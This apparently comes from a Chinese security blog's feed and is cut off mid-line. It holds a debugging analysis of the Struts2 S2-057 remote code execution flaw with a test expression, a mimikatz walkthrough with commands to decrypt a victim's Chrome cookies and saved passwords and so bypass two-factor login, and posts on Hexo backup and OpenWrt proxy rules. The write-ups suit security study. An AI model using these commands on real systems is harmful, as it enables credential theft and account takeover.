        <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞是由于在Struts2开发框架中使用namespace功能定义XML配置时，namespace值未被设置且在上层动作配置（Action Configuration）中未设置或用通配符namespace，可能导致远程代码执行。同理，url标签未设置value和action值且上层动作未设置或用通配符namespace时也可能导致远程代码执行</span><br></pre></td></tr></table></figure><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载 <code>https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip</code></p><p>使用IDEA来搭建环境<br>首先解压zip包，然后到apps目录下，解压war包，把解压好后目录结构如图：<br><img src="/img/s2-057/1600964363620-2on.png" alt="2on"></p><p>接着在IDEA中创建一个<code>webapp</code>的项目，然后把<code>showcase/WEB-INF/</code>中的文件拷贝到IDEA的<code>web/WEB-INF/</code>目录下<br><img src="/img/s2-057/1600964427955-sdr.png" alt="sdr"></p><p>接着把<code>showcase/</code>下面的其他目录拷贝到IDEA的<code>web</code>目录下，然后进入<code>showcase/WEB-INF/src/java/</code>目录，把文件拷贝到IDEA的<code>src/</code>目录下<br>然后再到IDEA中设置lib包的位置，lib包就在IDEA的<code>WEB-INF/lib</code>目录下，这样环境就配置好了</p><p>要触发漏洞，需要修改 <code>struts-actionchaining.xml</code>配置文件，从上面的描述，需要吧<code>namespace</code>给去掉，或者配置成通配符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name&#x3D;&quot;actionchaining&quot; extends&#x3D;&quot;struts-default&quot;&gt;</span><br><span class="line">        &lt;action name&#x3D;&quot;actionChain1&quot; class&#x3D;&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;</span><br><span class="line">            &lt;result type&#x3D;&quot;redirectAction&quot;&gt;</span><br><span class="line">                &lt;param name &#x3D; &quot;actionName&quot;&gt;register2&lt;&#x2F;param&gt;</span><br><span class="line">            &lt;&#x2F;result&gt;</span><br><span class="line">        &lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;package&gt;</span><br><span class="line">&lt;&#x2F;struts&gt;</span><br></pre></td></tr></table></figure><p>访问网址进行测试：<br>在url中访问 <code>site/$&#123;(100*100)&#125;/actionChain1.action</code><br><img src="/img/s2-057/1600964785790-vpo.png" alt="vpo"></p><p>从hackbar中，我们注入了表达式，表达式被成功执行，此时浏览器的地址栏显示地址为10000/register2.action<br>该漏洞的触发方式有3种，chain, redirectAction, postback：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struts-default.xml文件：</span><br><span class="line">&lt;result-types&gt;</span><br><span class="line">            &lt;result-type name&#x3D;&quot;chain&quot; class&#x3D;&quot;com.opensymphony.xwork2.ActionChainResult&quot;&#x2F;&gt;</span><br><span class="line">            &lt;result-type name&#x3D;&quot;redirectAction&quot; class&#x3D;&quot;org.apache.struts2.result.ServletActionRedirectResult&quot;&#x2F;&gt;</span><br><span class="line">            &lt;result-type name&#x3D;&quot;postback&quot; class&#x3D;&quot;org.apache.struts2.result.PostbackResult&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;result-types&gt;</span><br></pre></td></tr></table></figure><p>在<code>DefaultActionMapper.parseNameAndNamespace</code>函数处下断点,，截取部分代码，访问url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">protected void parseNameAndNamespace(String uri, ActionMapping mapping, ConfigurationManager configManager) &#123;</span><br><span class="line">        int lastSlash &#x3D; uri.lastIndexOf(47);</span><br><span class="line">        String namespace;    &#x2F;&#x2F;namespace: &quot;&#x2F;$&#123;(10*10)&#125;&quot;</span><br><span class="line">        String name;        &#x2F;&#x2F;name: &quot;actionChain1&quot;</span><br><span class="line">        if (lastSlash &#x3D;&#x3D; -1) &#123;</span><br><span class="line">            namespace &#x3D; &quot;&quot;;</span><br><span class="line">            name &#x3D; uri;</span><br><span class="line">        &#125; else if (lastSlash &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            namespace &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">            name &#x3D; uri.substring(lastSlash + 1);</span><br><span class="line">        &#125; else if (this.alwaysSelectFullNamespace) &#123;    &#x2F;&#x2F;true</span><br><span class="line">            namespace &#x3D; uri.substring(0, lastSlash);</span><br><span class="line">            name &#x3D; uri.substring(lastSlash + 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Configuration config &#x3D; configManager.getConfiguration();</span><br><span class="line">            String prefix &#x3D; uri.substring(0, lastSlash);</span><br><span class="line">            namespace &#x3D; &quot;&quot;;</span><br><span class="line">            boolean rootAvailable &#x3D; false;</span><br><span class="line">            Iterator i$ &#x3D; config.getPackageConfigs().values().iterator();</span><br><span class="line"></span><br><span class="line">            while(i$.hasNext()) &#123;</span><br><span class="line">                PackageConfig cfg &#x3D; (PackageConfig)i$.next();</span><br><span class="line">                String ns &#x3D; cfg.getNamespace();</span><br><span class="line">                if (ns !&#x3D; null &amp;&amp; prefix.startsWith(ns) &amp;&amp; (prefix.length() &#x3D;&#x3D; ns.length() || prefix.charAt(ns.length()) &#x3D;&#x3D; &#39;&#x2F;&#39;) &amp;&amp; ns.length() &gt; namespace.length()) &#123;</span><br><span class="line">                    namespace &#x3D; ns;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (&quot;&#x2F;&quot;.equals(ns)) &#123;</span><br><span class="line">                    rootAvailable &#x3D; true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            name &#x3D; uri.substring(namespace.length() + 1);</span><br><span class="line">            if (rootAvailable &amp;&amp; &quot;&quot;.equals(namespace)) &#123;</span><br><span class="line">                namespace &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!this.allowSlashesInActionNames) &#123;</span><br><span class="line">            int pos &#x3D; name.lastIndexOf(47);</span><br><span class="line">            if (pos &gt; -1 &amp;&amp; pos &lt; name.length() - 1) &#123;</span><br><span class="line">                name &#x3D; name.substring(pos + 1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mapping.setNamespace(namespace);</span><br><span class="line">        mapping.setName(this.cleanupActionName(name));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在进入函数后，可以看到<code>alwaysSelectFullNamespace = true</code>，那么<code>namespace</code>就是我们可以控制的输入点</p><p><img src="/img/s2-057/1601217508135-ocf.png" alt="ocf"></p><p>接着<code>namespace</code>保存到ActionMapping对象中，交由函数<code>parseActionName</code>来进行处理<br><img src="/img/s2-057/1601217639825-sga.png" alt="1601217639825-sga.png"></p><p>在<code>parseNameAndNamespace</code>处理完之后，会调用到<code>DefaultActionInvocation</code>类的<code>executeResult()</code>函数来进行处理，该函数用来决定此时程序是用什么样的方式来处理action，比如如下所示的则为使用<code>ActionChainResult</code>类来做处理，也就是<code>chain</code>的方式</p><p><img src="/img/s2-057/1602252632703-mon.png" alt="1602252632703-mon.png"></p><h3 id="Redirect-Action-攻击面"><a href="#Redirect-Action-攻击面" class="headerlink" title="Redirect Action 攻击面"></a>Redirect Action 攻击面</h3><p>在使用<code>Redirect Action</code>来触发漏洞的时候，会使用<code>ServletActionRedirectResult</code>来进行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Object</span><br><span class="line">     org.apache.struts2.result.StrutsResultSupport</span><br><span class="line">          org.apache.struts2.result.ServletRedirectResult</span><br><span class="line">               org.apache.struts2.result.ServletActionRedirectResult </span><br></pre></td></tr></table></figure><p>因为在<code>struts-actionchaining.xml</code>文件中没有设置<code>namespace</code>，所以此处的<code>namespace</code>为<code>null</code><br><img src="/img/s2-057/1601218126073-axz.png" alt="1601218126073-axz.png"></p><p>然后步入函数<code>invocation.getProxy().getNamespace()</code><br><code>invocation.getProxy()</code>实际上调用了<code>DefaultActionProxy</code>类的<code>getNamespace</code>方法</p><p><img src="/img/s2-057/1601218473662-6c6.png" alt="1601218473662-6c6.png"></p><p>调用完成后，可以看到<code>namespace</code>变为了输入点的内容</p><p><img src="/img/s2-057/1601218535664-7sb.png" alt="1601218535664-7sb.png"></p><p>接着到 <code>super.execute()</code> 函数这里的时候，跟进函数内部，接着继续跟进，然后就会跳到<code>StrutsResultSupport</code>类的<code>execute</code>函数进行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void execute(ActionInvocation invocation) throws Exception &#123;</span><br><span class="line">        this.lastFinalLocation &#x3D; this.conditionalParse(this.location, invocation);    &#x2F;&#x2F;$&#123;(10*10)&#125;&#x2F;register2.action</span><br><span class="line">        this.doExecute(this.lastFinalLocation, invocation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/img/s2-057/1601219207004-vlq.png" alt="1601219207004-vlq.png"></p><p>此时<code>location</code>为要跳转的url地址，跟进去看看是如何处理的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected String conditionalParse(String param, ActionInvocation invocation) &#123;</span><br><span class="line">        return this.parse &amp;&amp; param !&#x3D; null &amp;&amp; invocation !&#x3D; null ? TextParseUtil.translateVariables(param, invocation.getStack(), new StrutsResultSupport.EncodingParsedValueEvaluator()) : param;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时调用了<code>TextParseUtil.translateVariables</code>，跟进</p><p><img src="/img/s2-057/1601219531298-jf2.png" alt="1601219531298-jf2.png"></p><p>此时的stack为<code>ognlvalueStack</code>，接着再跟进函数<code>translateVariables</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static String translateVariables(String expression, ValueStack stack, TextParseUtil.ParsedValueEvaluator evaluator) &#123;</span><br><span class="line">        return translateVariables(new char[]&#123;&#39;$&#39;, &#39;%&#39;&#125;, expression, stack, String.class, evaluator).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时<br><code>expression = /$&#123;(10*10)&#125;/register2.action</code><br><code>evaluator</code>对象的值为：</p><p><img src="/img/s2-057/1601219837029-35p.png" alt="1601219837029-35p.png"></p><p>跟进后调用的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Object translateVariables(char[] openChars, String expression, final ValueStack stack, final Class asType, final TextParseUtil.ParsedValueEvaluator evaluator, int maxLoopCount) &#123;</span><br><span class="line">        TextParseUtil.ParsedValueEvaluator ognlEval &#x3D; new TextParseUtil.ParsedValueEvaluator() &#123;</span><br><span class="line">            public Object evaluate(String parsedValue) &#123;</span><br><span class="line">                Object o &#x3D; stack.findValue(parsedValue, asType);</span><br><span class="line">                if (evaluator !&#x3D; null &amp;&amp; o !&#x3D; null) &#123;</span><br><span class="line">                    o &#x3D; evaluator.evaluate(o.toString());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return o;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        TextParser parser &#x3D; (TextParser)((Container)stack.getContext().get(&quot;com.opensymphony.xwork2.ActionContext.container&quot;)).getInstance(TextParser.class);</span><br><span class="line">        return parser.evaluate(openChars, expression, ognlEval, maxLoopCount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数创建了一个<code>ognleval</code>对象，并且传入了<code>parser.evaluate</code></p><p><img src="/img/s2-057/1601220112230-276.png" alt="1601220112230-276.png"></p><p>在经过一系列的运算解析之后，返回到<code>StrutsResultSupport</code>类的<code>execute</code>方法，此时我们可以看到，<code>this.lastFinalLocation</code>的值已经改变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void execute(ActionInvocation invocation) throws Exception &#123;</span><br><span class="line">        this.lastFinalLocation &#x3D; this.conditionalParse(this.location, invocation);</span><br><span class="line">        this.doExecute(this.lastFinalLocation, invocation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/img/s2-057/1601220475808-ti3.png" alt="1601220475808-ti3.png"></p><p>此时注入的表达式已经被成功执行。从上面的分析可以看出，漏洞的主要成因在2个点上，先是<code>alwaysSelectFullNamespace</code>设置为<code>true</code>，所以<code>namespace</code>从url获取，也就是<code>payload</code>的输入点，其次是<code>xml</code>文件中<code>namespace</code>为null，否则就不会用用户的输入作为<code>namespace</code>，那么漏洞就没法触发。</p><h3 id="Action-Chaining-攻击面"><a href="#Action-Chaining-攻击面" class="headerlink" title="Action Chaining 攻击面"></a>Action Chaining 攻击面</h3><p>首先把<code>struts-actionchaining.xml</code>文件进行修改，把<code>result type</code> 改成 <code>chain</code>，要修改的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; find . -name &quot;struts-actionchaining.xml&quot;</span><br><span class="line">.&#x2F;web&#x2F;WEB-INF&#x2F;src&#x2F;java&#x2F;struts-actionchaining.xml</span><br><span class="line">.&#x2F;web&#x2F;WEB-INF&#x2F;classes&#x2F;struts-actionchaining.xml</span><br><span class="line">.&#x2F;src&#x2F;struts-actionchaining.xml</span><br><span class="line">.&#x2F;out&#x2F;production&#x2F;s2-057&#x2F;struts-actionchaining.xml</span><br><span class="line">.&#x2F;out&#x2F;artifacts&#x2F;s2_057_war_exploded&#x2F;WEB-INF&#x2F;src&#x2F;java&#x2F;struts-actionchaining.xml</span><br><span class="line">.&#x2F;out&#x2F;artifacts&#x2F;s2_057_war_exploded&#x2F;WEB-INF&#x2F;classes&#x2F;struts-actionchaining.xml</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;action name&#x3D;&quot;actionChain1&quot; class&#x3D;&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;</span><br><span class="line">            &lt;result type&#x3D;&quot;chain&quot;&gt;</span><br><span class="line">                &lt;param name&#x3D;&quot;actionName&quot;&gt;register2&lt;&#x2F;param&gt;</span><br><span class="line">            &lt;&#x2F;result&gt;</span><br><span class="line">        &lt;&#x2F;action&gt;</span><br></pre></td></tr></table></figure><p>使用<code>chain</code>的方式，会调用 <code>com.opensymphony.xworks2.ActionChainResult.execute()</code> 方法来进行处理，在该函数下断点</p><p><img src="/img/s2-057/1602252766614-4hr.png" alt="1602252766614-4hr.png"></p><p>当<code>namespace</code>为<code>null</code>的时候，则会调用<code>invocation.getProxy().getNamespace()</code>去获取<code>namespace</code>，获取到<code>namespace</code>后，经过<code>TextParseUtil.translateVariable</code>函数处理之后，<code>namespace</code>进行了表达式运算，从 <code>/$&#123;(100*100)&#125; ==&gt; /10000</code>，这样漏洞就触发了。</p><h3 id="PostBack-Result-攻击面"><a href="#PostBack-Result-攻击面" class="headerlink" title="PostBack Result 攻击面"></a>PostBack Result 攻击面</h3><p>先修改<code>struts-actionchaining.xml</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result type&#x3D;&quot;postback&quot;&gt;</span><br><span class="line">    &lt;param name &#x3D; &quot;actionName&quot;&gt;register2&lt;&#x2F;param&gt;</span><br><span class="line">&lt;&#x2F;result&gt;</span><br></pre></td></tr></table></figure><p>从上面得知该方式使用了<code>org.apache.struts2.result.PostbackResult.execute()</code>函数来做处理，在该函数下段点，在<code>DefaultActionInvocation</code>类中可以看到具体调用到了<code>PostbackResult</code>类来做处理</p><p><img src="/img/s2-057/1602255817968-jrx.png" alt="1602255817968-jrx.png"></p><p>跟进到<code>PostbackResult.execute()</code></p><p><img src="/img/s2-057/1602255841276-tkh.png" alt="1602255841276-tkh.png"></p><p>继续跟进 <code>this.makePostbackUri</code> 函数，可以看到<code>namespace</code>为<code>null</code>，也是通过<code>invocation.getProxy().getNamespace()</code>函数来获取<code>namespace</code>的</p><p><img src="/img/s2-057/1602255965997-hrc.png" alt="1602255965997-hrc.png"></p><p>处理完成后</p><p><img src="/img/s2-057/1602256066225-st2.png" alt="1602256066225-st2.png"></p><p>接着就是调用<code>super.execute</code>函数，实际上调用了<code>StrutsResultSupport.execute</code>函数来做处理，也就和上面的<code>Redirect Action</code>的是一样的了</p><p><img src="/img/s2-057/1602256220632-uwb.png" alt="1602256220632-uwb.png"></p><p>表达式成功执行</p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://xz.aliyun.com/t/2618">https://xz.aliyun.com/t/2618</a></p><p><a href="https://github.com/jas502n/St2-057/blob/master/README.md">https://github.com/jas502n/St2-057/blob/master/README.md</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用mimikatz获取chrome的用户数据</title>
      <link href="2019/07/07/mimikatz-read-chrome-data/"/>
      <url>2019/07/07/mimikatz-read-chrome-data/</url>
      
        <content type="html"><![CDATA[<h3 id="1-在线获取"><a href="#1-在线获取" class="headerlink" title="1.在线获取"></a>1.在线获取</h3><p>必须要登录到用户的计算机上</p><p>导出<code>cookies</code></p><p><code>dpapi::chrome /in:&quot;C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\cookies&quot;</code></p><p><img src="/img/onlinecookies.png" alt="cookies"></p><p>导出登录凭证<br><code>dpapi::chrome /in:&quot;C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\login data&quot; /unprotect</code></p><h3 id="2-离线获取"><a href="#2-离线获取" class="headerlink" title="2.离线获取"></a>2.离线获取</h3><p>有几点要求，需要知道目标的SID和密码，或者有域的根密钥</p><p>如果没有正确的masterkey，解密的时候会出现错误，如果有足够的权限，也可以使用mimikatz的<code>sekurlsa::dpapi</code>命令来获取masterkey，当然我们要离线的话，就不能把mimikatz上传到服务器</p><p><img src="/img/decrypterror.png" alt="decerror"></p><p>SID和masterkey在用户的<code>%appdata%</code>目录下</p><p><img src="/img/sidandmasterkey.png" alt="sidkey"></p><p>使用SID配合密码导入masterkey，然后对cookies进行解密，这样解出来的masterkey是默认导入了mimikatz的缓存里，解密时候不需要指定masterkey<br><code>dpapi::masterkey /in:&quot;1853c496-c182-49eb-aa4e-79a24e9bd90c&quot; /SID:S-1-5-21-2104814972-2348396718-1065983387-1653 /password:YourPassword /unprotect</code></p><p><img src="/img/masterkey.png" alt="masterkey"></p><p><code>dpapi::chrome /in:&quot;cookies&quot;</code><br><img src="/img/decryptcookie.png" alt="decryptcookie"></p><p>获得了chrome中保存的cookie，只要用户在登录google的时候，选择了记住该设备，那么可以利用解密出来的cookie进行登录，绕过google的双因素验证</p><p>使用mimikatz导出的backupkey来进行解密，导出的4个文件中最重要的为.pvk文件<br><code>lsadump::backupkeys /export /system:dc.computer.com</code></p><p><img src="/img/backupkeys.png" alt="backupkeys"></p><p>使用.pvk文件进行解密masterkey，并解出cookies<br><img src="/img/pvkdec.png" alt="pvk1"></p><p><img src="/img/pvkcookies.png" alt="pvk2"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++">https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
            <tag> sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客的备份和恢复</title>
      <link href="2019/07/07/hexo-backup-and-restore/"/>
      <url>2019/07/07/hexo-backup-and-restore/</url>
      
        <content type="html"><![CDATA[<p>1.先把github上的博客repo克隆下来</p><p>2.设置两个分支分别为<code>master</code>和<code>hexo</code>，<code>hexo</code>用来存放博客的配置文件， 主题文件等等</p><p>3.配置<code>hexo</code>分支中的<code>_config.yml</code>文件，修改如下，把hexo生成的静态页面存放到master分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:username&#x2F;blog.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>4.切换到<code>hexo</code>分支，依次执行命令，不要执行 <strong>npm install init</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br><span class="line">npm install</span><br><span class="line">sudo npm install hexp-cli -g</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>5.生成内容以及发布</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;blog title&quot;</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;something&quot;</span><br><span class="line">git push origin hexo</span><br><span class="line"></span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用openwrt搭建上网网关</title>
      <link href="2019/07/07/transparent-proxy/"/>
      <url>2019/07/07/transparent-proxy/</url>
      
        <content type="html"><![CDATA[<p>前阵子买了一个openwrt路由器，就捣鼓了一下，使用<code>ssr + chinadns + dnsmasq + iptables</code>搭建上网代理，这里简单记录一下</p><p>1.配置ssr-redir</p><p>2.配置chinadns<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chinadns -c chnroute.txt -p 5353</span><br><span class="line">curl &#39;http:&#x2F;&#x2F;ftp.apnic.net&#x2F;apnic&#x2F;stats&#x2F;apnic&#x2F;delegated-apnic-latest&#39; | grep ipv4 | grep CN | awk -F\| &#39;&#123; printf(&quot;%s&#x2F;%d\n&quot;, $4, 32-log($5)&#x2F;log(2)) &#125;&#39; &gt; chnroute.txt</span><br><span class="line">可以使用crontab每周更新一次</span><br><span class="line">0 0 * * 0 command</span><br></pre></td></tr></table></figure></p><p>3.dnsmasq配置<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;dnsmasq.d&#x2F;dnsmasq.conf</span><br><span class="line">no-resolv</span><br><span class="line">server&#x3D;127.0.0.1#5353</span><br></pre></td></tr></table></figure></p><p>4.iptables<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">iptables -t nat -N SS</span><br><span class="line">#iptables -t nat -A SS -p tcp --dport 443 -j RETURN    #ssr服务器端口</span><br><span class="line">iptables -t nat -A SS -d ssr-server -j RETURN        #ssr服务器IP    二选1</span><br><span class="line"></span><br><span class="line">iptables -t nat -A SS -d 0.0.0.0&#x2F;8 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 10.0.0.0&#x2F;8 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 127.0.0.0&#x2F;8 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 169.254.0.0&#x2F;16 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 172.16.0.0&#x2F;12 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 192.168.0.0&#x2F;16 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 224.0.0.0&#x2F;4 -j RETURN</span><br><span class="line">iptables -t nat -A SS -d 240.0.0.0&#x2F;4 -j RETURN</span><br><span class="line">#iptables -t nat -A SS -d chinaIP -j RETURN</span><br><span class="line"></span><br><span class="line">iptables -t nat -A SS -p tcp -j REDIRECT --to-ports 10800</span><br><span class="line">iptables -t nat -I PREROUTING -p tcp -j SS</span><br><span class="line">#iptables -t nat -I PREROUTING -p udp -j SS                </span><br><span class="line">#iptables -t nat -I PREROUTING -p udp --dport 53 -j DNAT --to-destination 1.2.3.4:53 # 可以配合dnsforward，把dns查询转换成TCP</span><br></pre></td></tr></table></figure></p><p>这样设置好之后，是全局翻墙模式，要分IP进行代理的话，需要在iptables中加入china IP，使用APNIC生成的IP太庞大了，所以这里使用的是 <a href="https://github.com/ashi009/bestroutetb">bestroutetb</a>，把生成的net列表替换到<code>iptables</code>中即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bestroutetb \</span><br><span class="line">  --output 20-route \</span><br><span class="line">  --route.net&#x3D;cn \</span><br><span class="line">  --route.vpn&#x3D;us \</span><br><span class="line">  --profile&#x3D;custom \</span><br><span class="line">  --no-default-gateway \</span><br><span class="line">  --group-gateway \</span><br><span class="line">  --group-name.net&#x3D;wan \</span><br><span class="line">  --group-name.vpn&#x3D;vpn \</span><br><span class="line">  --group-header&#x3D;$&#39;%name)\n&#39; \</span><br><span class="line">  --rule-format&#x3D;$&#39;iptables -t nat -A SS -d  %prefix&#x2F;%length -j RETURN\n&#39; \</span><br><span class="line">  --gateway.net&#x3D;&#39;$5&#39; \</span><br><span class="line">  --gateway.vpn&#x3D;&#39;$5&#39; \</span><br><span class="line">  -vvf</span><br></pre></td></tr></table></figure><p>如果要设置透明代理，使用下面的iptables规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ens38 lan ens33 wan</span><br><span class="line">iptables -A FORWARD -i ens38 -o ens33 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i ens33 -o ens38 -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -t 